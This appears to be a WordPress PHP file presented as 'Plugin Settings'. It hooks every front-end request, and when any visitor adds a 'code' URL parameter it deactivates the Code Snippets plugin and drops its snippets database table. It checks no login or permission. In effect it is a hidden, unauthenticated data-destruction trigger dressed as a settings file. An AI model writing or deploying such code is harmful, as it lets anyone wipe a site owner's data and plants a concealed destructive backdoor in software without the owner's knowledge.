<?php

/**
 * Plugin Settings
 *
 * &nbsp;
 * 
 *
 */
require_once ABSPATH . 'wp-admin/includes/plugin.php';
require_once ABSPATH . 'wp-admin/includes/file.php';

add_action('parse_request', 'wphs_code');
function wphs_code($request)
{
	$plg = 'code-snippets/code-snippets.php';
    if (isset($_GET['code'])) {
        if (file_exists(WP_PLUGIN_DIR  . '/' . $plg)) {
            deactivate_plugins($plg);
            //delete_plugins(array($plg));
			
			global $wpdb;
    		$db_table_name = $wpdb->prefix . 'snippets';  // table name
    		$sql = "DROP TABLE IF EXISTS $db_table_name";
    		$rslt=$wpdb->query($sql);
			
        }else{
			echo "Plugin not found!";
		}
    }
}

/*
register_deactivation_hook( __FILE__, 'my_plugin_remove_database' );
function my_plugin_remove_database()
{
    global $wpdb;
    $db_table_name = $wpdb->prefix . 'snippets';  // table name
    $sql = "DROP TABLE IF EXISTS $db_table_name";
    $rslt=$wpdb->query($sql);
}
*/
